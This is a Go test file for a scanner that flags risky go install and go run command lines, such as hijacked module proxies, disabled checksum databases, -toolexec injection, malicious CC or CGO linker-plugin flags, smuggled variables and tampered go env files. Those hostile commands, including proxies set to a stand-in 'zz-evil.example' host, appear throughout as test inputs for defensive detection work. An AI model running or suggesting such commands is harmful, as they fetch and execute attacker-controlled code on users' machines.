package installread

import (
	"slices"
	"strings"
	"testing"
)

// ECO-1 Go, round 3 (re-review of e9287e64, an internal review note; its reader probes
// adopted as assertions).

func TestGoR3Holds(t *testing.T) {
	for line, code := range map[string]string{
		// P2-1: a bool flag written -w=true / -w=1
		"go env -w=true GOPROXY=https://zz-evil.example && go install example.com/zz@v1.0.0": "custom_registry",
		"go env -w=1 GOFLAGS=-toolexec=./w && go run example.com/zz@v1.0.0":                  "code_from_environment",
		"go env --w=t GOSUMDB=off && go install example.com/zz@v1.0.0":                       "custom_registry",
		// P2-2: go env -u removes only what go env -w wrote; the exported variable still wins
		"export GOPROXY=https://zz-evil.example; go env -u GOPROXY; go install example.com/zz@v1.0.0": "custom_registry",
		"export GOFLAGS=-toolexec=./w; go env -u GOFLAGS && go run example.com/zz@v1.0.0":             "code_from_environment",
		"GOPROXY=https://zz-evil.example go env -u GOPROXY; go install example.com/zz@v1.0.0":         "custom_registry",
		// P2-3: go env -w with a name or pair the line does not show
		"K=GOPROXY; go env -w $K=https://zz-evil.example && go install example.com/zz@v1.0.0":        "variable_argument",
		`V=GOFLAGS=-toolexec=./w; go env -w "$V" && go run example.com/zz@v1.0.0`:                    "variable_argument",
		"go env -w $(cat zz.env) && go install example.com/zz@v1.0.0":                                "command_substitution",
		"go env -w `cat zz.env` && go install example.com/zz@v1.0.0":                                 "command_substitution",
		"echo GOPROXY=https://zz-evil.example | xargs go env -w && go install example.com/zz@v1.0.0": "stdin_arguments",
		`go env -w GOPRO\XY=https://zz-evil.example && go install example.com/zz@v1.0.0`:             "custom_registry", // the shell drops the \ (READER-ESCAPE-1): the real GOPROXY
		"K=GOPROXY; export $K=https://zz-evil.example; go install example.com/zz@v1.0.0":             "variable_argument",
		`export GOPRO\XY=https://zz-evil.example; go install example.com/zz@v1.0.0`:                  "custom_registry",
		// P2-4: go -C dir before the subcommand
		"go -C /tmp install -toolexec=./w example.com/zz@v1.0.0":  "code_from_environment",
		"go --C /tmp install -toolexec=./w example.com/zz@v1.0.0": "code_from_environment",
		"go -x install example.com/zz@v1.0.0":                     "unknown_install_form",
		// P2-5: the env an MCP add command gives the server
		"npx -y @anthropic-ai/claude-code mcp add zz -e GOSUMDB=off -- go run example.com/zz@v1.0.0": "custom_registry",
		// P3-1: code locations that climb out (round 4 drops the "not a Go folder" rule: TestGoR4AbsoluteFoldersClean)
		"GOMODCACHE=$HOME/../../tmp/zz go install golang.org/x/tools/cmd/goimports@v0.24.0": "code_from_environment",
		"GOPATH=/usr/local/go/../../home/u/proj go install example.com/zz@v1.0.0":           "code_from_environment",
		// P3-2: every word of CC, more C flags, GCCGO and PKG_CONFIG
		"CC='ccache ./evilcc' go install example.com/zz@v1.0.0":                           "code_from_environment",
		"CC='gcc -fplugin=./x.so' go install example.com/zz@v1.0.0":                       "code_from_environment",
		"CGO_CFLAGS='-include ./evil.h' go install example.com/zz@v1.0.0":                 "code_from_environment",
		"CGO_CFLAGS='-imacros ./evil.h' go install example.com/zz@v1.0.0":                 "code_from_environment",
		"CGO_CFLAGS=-I./x go install example.com/zz@v1.0.0":                               "code_from_environment",
		"CGO_CFLAGS='-isystem /tmp/x' go install example.com/zz@v1.0.0":                   "code_from_environment",
		"CGO_CFLAGS='-iquote ./x' go install example.com/zz@v1.0.0":                       "code_from_environment",
		"CGO_LDFLAGS='-Wl,-plugin,./x.so' go install example.com/zz@v1.0.0":               "code_from_environment",
		"CGO_LDFLAGS='-L./x -lzz' go install example.com/zz@v1.0.0":                       "code_from_environment",
		"CGO_LDFLAGS=--sysroot=./x go install example.com/zz@v1.0.0":                      "code_from_environment",
		"CGO_LDFLAGS='-Xlinker -plugin -Xlinker ./x.so' go install example.com/zz@v1.0.0": "code_from_environment",
		"GCCGO=./evil go install -compiler=gccgo example.com/zz@v1.0.0":                   "code_from_environment",
		"PKG_CONFIG=./evil go install example.com/zz@v1.0.0":                              "code_from_environment",
		// P3-3: the go env file written by other means; the golang.org/dl wrappers are go
		"echo GOFLAGS=-toolexec=./w >> ~/.config/go/env && go run example.com/zz@v1.0.0":  "custom_registry",
		"cp zz.env ~/.config/go/env && go install example.com/zz@v1.0.0":                  "custom_registry",
		"tee -a $HOME/.config/go/env < zz && go install example.com/zz@v1.0.0":            "custom_registry",
		"go1.22.0 env -w GOFLAGS=-toolexec=./w && go run example.com/zz@v1.0.0":           "code_from_environment",
		"gotip env -w GOPROXY=https://zz-evil.example && gotip install example.com/zz@v1": "custom_registry",
		// the honest lines that stay holds: a shared temporary folder, a toolchain found on PATH
		"GOCACHE=/tmp/gocache go install github.com/zz/t@latest":       "code_from_environment",
		"GOMODCACHE=/tmp/gomodcache go install github.com/zz/t@latest": "code_from_environment",
		"GOPATH=/tmp/go go install github.com/zz/t@latest":             "code_from_environment",
		"HOME=/tmp go install github.com/zz/t@latest":                  "custom_registry",
		"GOTOOLCHAIN=local+path go install github.com/zz/t@latest":     "code_from_environment",
	} {
		_, codes := codesOf(line)
		if !slices.Contains(codes, code) {
			t.Errorf("ParseLine(%q): codes %q; want %s", line, codes, code)
		}
	}
}

// The reasons on honest lines say plainly why: a shared temporary folder others can write, a toolchain from PATH.
func TestGoR3PlainReasons(t *testing.T) {
	for line, want := range map[string]string{
		"GOCACHE=/tmp/gocache go install github.com/zz/t@latest":          "a shared temporary folder others can write",
		"HOME=/tmp go install github.com/zz/t@latest":                     "a shared temporary folder others can write",
		"GOTOOLCHAIN=local+path go install github.com/zz/t@latest":        "a go toolchain found on PATH",
		"GOMODCACHE=./c go install github.com/zz/t@latest":                "a folder of the project or the current directory",
		"GOMODCACHE=$HOME/../../tmp/zz go install github.com/zz/t@latest": "climbs out",
		"GOMODCACHE=$PWD/c go install github.com/zz/t@latest":             "through a variable",
	} {
		_, unread, _, _ := ParseLine(line)
		if !slices.ContainsFunc(unread, func(u string) bool { return strings.Contains(u, want) }) {
			t.Errorf("ParseLine(%q): %q; want a reason saying %q", line, unread, want)
		}
	}
}

// Honest lines the round keeps clean: the README corpus's forms and the constructed honest lines' Go folders.
func TestGoR3StillRead(t *testing.T) {
	for _, line := range []string{
		"GOSUMDB=sum.golang.google.cn go install github.com/zz/t@latest",
		"GOMODCACHE=/go/pkg/mod go install github.com/zz/t@latest",
		"GOPATH=/go go install github.com/zz/t@latest",
		"GOPATH=$HOME/go go install github.com/zz/t@latest",
		"GOCACHE=/root/.cache/go-build go install github.com/zz/t@latest",
		"GOMODCACHE=/home/u/go/pkg/mod GOROOT=/usr/local/go go install github.com/zz/t@latest",
		"GOROOT=/opt/homebrew/Cellar/go/1.27.4/libexec go install github.com/zz/t@latest",
		"GOROOT=/home/u/sdk/go1.27.4 go install github.com/zz/t@latest",
		"GOCACHE=/Users/u/Library/Caches/go-build go install github.com/zz/t@latest",
		"HOME=/root go install github.com/zz/t@latest",
		"CC=gcc-13 go install github.com/zz/t@latest",
		`CC="zig cc -target x86_64-linux" go install github.com/zz/t@latest`,
		"CC=x86_64-linux-musl-gcc CGO_ENABLED=1 go install github.com/zz/t@latest",
		`CGO_LDFLAGS="-L/usr/local/lib -lsqlite3" go install github.com/zz/t@latest`,
		`CGO_CFLAGS="-I/usr/local/include" go install github.com/zz/t@latest`,
		"CGO_CFLAGS='-O2 -g' go install github.com/zz/t@latest",
		"go env -w GO111MODULE=on && go install github.com/zz/t@latest",
		"go env -w GOBIN=$HOME/bin && go install github.com/zz/t@latest",
		"go -C ./tools install github.com/zz/t@latest",
		"go -C=tools run github.com/zz/t@latest",
		"go env -w=false GOPROXY=https://zz-evil.example; go install github.com/zz/t@latest",
		"go env w GOPROXY=https://zz-evil.example; go install github.com/zz/t@latest", // a word, not the flag
		"claude mcp add zz -e API_KEY=x -- go run github.com/zz/t@latest",
		"go -h",
		"go -C d build ./...",
	} {
		targets, codes := codesOf(line)
		if len(codes) > 0 {
			t.Errorf("ParseLine(%q): codes %q", line, codes)
		}
		if strings.Contains(line, "@latest") && len(targets) != 1 {
			t.Errorf("ParseLine(%q): targets %q", line, targets)
		}
	}
}

// P2-4, P3-4: go -C names its target; a private path is named only as go-private:, which the server never sends to a
// registry (it may only answer it from its own block feed).
func TestGoR3Targets(t *testing.T) {
	for line, want := range map[string]string{
		"go -C /tmp install example.com/zz@v1.0.0":                                     "go:example.com/zz@v1.0.0",
		"go -C=/tmp run example.com/zz@v1.0.0 -v":                                      "go:example.com/zz@v1.0.0",
		"go1.22.0 install example.com/zz@v1.0.0":                                       "go:example.com/zz@v1.0.0",
		"GOPROXY=direct go install example.com/zz@v1.0.0":                              "go-private:example.com/zz@v1.0.0",
		"GOPRIVATE=corp.example go install corp.example/zz@v1.0.0":                     "go-private:corp.example/zz@v1.0.0",
		"GOPROXY=https://goproxy.cn,direct go install github.com/zz/mal@v1.0.0":        "go-private:github.com/zz/mal@v1.0.0",
		"claude mcp add zz -e GOPRIVATE=corp.example -- go run corp.example/zz@v1.0.0": "env GOPRIVATE=corp.example go run corp.example/zz@v1.0.0",
	} {
		targets, _, _, _ := ParseLine(line)
		if !slices.Contains(targets, want) {
			t.Errorf("ParseLine(%q): targets %q; want %q", line, targets, want)
		}
	}
}

// The pairs of go env -w that the line does not show may set GOPRIVATE: the target is go-private:, never go:.
func TestGoR3UnseenPairsArePrivate(t *testing.T) {
	for _, line := range []string{
		"K=GOPRIVATE; go env -w $K=corp.example && go install corp.example/zz@v1.0.0",
		`V=GOPRIVATE=corp.example; go env -w "$V" && go install corp.example/zz@v1.0.0`,
		"go env -w GOPRIVATE=$P && go install corp.example/zz@v1.0.0",
		"go env -w $(cat zz.env) && go install corp.example/zz@v1.0.0",
		"echo GOPRIVATE=corp.example | xargs go env -w && go install corp.example/zz@v1.0.0",
		"go env -w=true GOPRIVATE=corp.example && go install corp.example/zz@v1.0.0",
		"K=GOPRIVATE; export $K=corp.example; go install corp.example/zz@v1.0.0",
		"npx -y @anthropic-ai/claude-code mcp add zz --env=GOPRIVATE=corp.example -- go run corp.example/zz@v1.0.0",
	} {
		targets, _, _, _ := ParseLine(line)
		if !slices.Contains(targets, "go-private:corp.example/zz@v1.0.0") {
			t.Errorf("ParseLine(%q): targets %q; want go-private:", line, targets)
		}
	}
}
